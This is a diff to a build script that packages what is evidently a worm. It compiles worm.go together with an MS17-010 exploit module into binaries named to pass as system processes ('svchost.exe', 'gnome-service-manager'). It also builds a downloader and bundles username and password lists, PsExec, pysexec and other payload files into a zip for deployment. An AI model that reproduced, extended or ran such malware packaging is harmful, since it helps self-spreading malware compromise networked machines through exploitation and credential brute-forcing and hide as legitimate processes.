@@ -4,10 +4,10 @@ if [ ! -d ./dist ]; then
 fi
 
 GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/lindown downloader.go
-GOOS=windows GOARCH=386 go build -o ./dist/windown.exe downloader.go
+GOOS=windows GOARCH=386 go build -o ./dist/windown.exe downloader.go pysexec.go
 
 GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/gnome-service-manager worm.go ms17_010.go
-GOOS=windows GOARCH=386 go build -o ./dist/svchost.exe worm.go ms17_010.go
+GOOS=windows GOARCH=386 go build -o ./dist/svchost.exe worm.go ms17_010.go pysexec.go
 
 cp user.txt ./dist/
 cp passwds.txt ./dist/
@@ -18,5 +18,8 @@ cp 64 ./dist/
 cp 64_1 ./dist/
 cp PsExec.exe ./dist/
 cp anomaly ./dist/
+cp anomaly.exe ./dist/
+cp pysexec_32 ./dist/
+cp pysexec_64 ./dist/
 
 cd dist && zip -r ../file.zip *
